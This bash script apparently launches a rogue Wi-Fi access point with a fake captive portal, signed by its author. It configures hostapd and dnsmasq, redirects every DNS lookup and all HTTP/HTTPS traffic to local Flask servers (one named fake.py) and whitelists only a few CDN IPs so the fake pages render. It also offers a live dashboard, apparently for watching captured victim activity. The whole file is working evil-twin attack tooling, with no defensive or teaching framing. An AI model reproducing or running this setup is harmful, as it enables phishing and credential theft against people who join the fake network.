#!/bin/bash

# ─── CONFIGURATION ────────────────────────────────────────────────
IFACE="wlan0"
GATEWAY="10.0.0.1"
CERT_FILE="cert.crt"
KEY_FILE="cert.key"

# ─── 1. Kill existing services ────────────────────────────────────
echo "[*] Stopping conflicting services..."
sudo pkill hostapd
sudo pkill dnsmasq
sudo iptables -t nat -F
sudo iptables -F FORWARD

# ─── 2. Bring up interface ────────────────────────────────────────
echo "[*] Configuring $IFACE..."
sudo ip link set $IFACE down
sudo iw dev $IFACE set type __ap
sudo ip addr add $GATEWAY/24 dev $IFACE
sudo ip link set $IFACE up

# ─── 3. Start hostapd ─────────────────────────────────────────────
echo "[*] Starting hostapd..."
sudo hostapd hostapd.conf > /dev/null 2>&1 &
sleep 2

# ─── 4. Start dnsmasq ─────────────────────────────────────────────
echo "[*] Starting dnsmasq..."
sudo dnsmasq -C dnsmasq.conf

# ─── 5. Enable IP forwarding ──────────────────────────────────────
echo "[*] Enabling IP forwarding..."
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null

# ─── 6. Set iptables rules ────────────────────────────────────────
echo "[*] Setting iptables rules..."

# Redirect HTTP/HTTPS to Flask
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 -j REDIRECT --to-port 443

# NAT masquerade
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# ─── 6a. Allow CDN IPs for resources (from wlan0 to eth0) ─────────

# Bootstrap CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.18.11.207 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.18.10.207 -j ACCEPT

# jQuery CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.130.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.66.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.194.137 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 151.101.2.137 -j ACCEPT

# FontAwesome CDN
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.17.25.14 -j ACCEPT
sudo iptables -A FORWARD -i $IFACE -o eth0 -d 104.17.24.14 -j ACCEPT

# Allow response traffic from internet
sudo iptables -A FORWARD -i eth0 -o $IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# Block everything else from clients
sudo iptables -A FORWARD -i $IFACE -o eth0 -j DROP

# ─── 7. Start Flask servers ───────────────────────────────────────
echo "[*] Launching Flask HTTPS portal (port 443)..."
sudo python3 fake.py > /dev/null 2>&1 &

echo "[*] Launching Flask HTTP redirector (port 80)..."
sudo python3 http_redirect.py > /dev/null 2>&1 &

# ─── 8. Done ──────────────────────────────────────────────────────
echo "[✓] Rogue AP is live at $GATEWAY"
echo "[✓] DNS is redirecting all domains to captive portal"
echo "[✓] CDN whitelisting is active"
echo "[✓] Created by WarrenWarren5454"

# ─── 9. Interactive Loop ──────────────────────────────────────────
while true; do
    echo ""
    echo "[*] Options:"
    echo "[1] Stop Rogue AP and Flask Servers"
    echo "[2] Open Real-Time Dashboard"

    read -p "Select an option: " choice

    if [[ "$choice" == "1" ]]; then
        echo "[*] Stopping services..."
        sudo pkill hostapd
        sudo pkill dnsmasq
        sudo pkill -f fake.py
        sudo pkill -f http_redirect.py
        sudo iptables -t nat -F
        sudo iptables -F FORWARD
        sudo ip link set $IFACE down
        echo "[✓] Rogue AP stopped."
        exit 0

    elif [[ "$choice" == "2" ]]; then
        echo "[*] Opening dashboard at http://10.0.0.1/dashboard"
        xdg-open "https://10.0.0.1/dashboard" >/dev/null 2>&1 &
    
    else
        echo "[↻] Menu refreshed. Press [1] to quit or [2] to open dashboard."
    fi
done


